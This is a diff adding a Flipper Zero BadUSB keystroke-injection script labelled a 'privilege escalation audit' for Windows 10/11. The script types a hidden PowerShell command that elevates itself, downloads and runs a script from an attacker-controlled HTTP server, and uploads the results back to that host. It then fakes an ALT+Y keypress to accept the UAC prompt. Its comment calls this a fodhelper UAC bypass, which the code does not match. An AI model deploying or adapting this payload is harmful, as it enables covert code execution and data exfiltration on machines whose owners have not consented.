@@ -1,0 +1,23 @@
+REM Title: BadUSB - Windows Privilege Escalation Audit
+REM Description: Opens elevated PowerShell via UAC bypass and downloads/runs
+REM              PrivescAudit-Windows.ps1 from attacker HTTP server.
+REM Target: Windows 10/11
+REM Author: <operator>
+REM Note: Flipper Zero BadUSB uses DuckyScript 1.0 syntax.
+REM       Set LHOST to your attacker IP before deploying.
+
+DELAY 2000
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Type PowerShell command — single-stage UAC bypass via fodhelper
+STRING powershell -W Hidden -NoP -NonI -Exec Bypass -C "Start-Process powershell -Verb runAs -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C ""iwr http://172.16.84.1:8080/PrivescAudit-Windows.ps1 -OutFile $env:TEMP\pa.ps1; & $env:TEMP\pa.ps1 | Out-File $env:TEMP\privesc_out.txt; iwr -Method POST -InFile $env:TEMP\privesc_out.txt http://172.16.84.1:8080/upload""'"
+DELAY 200
+ENTER
+
+REM Accept UAC prompt
+DELAY 2000
+ALT y
+DELAY 500
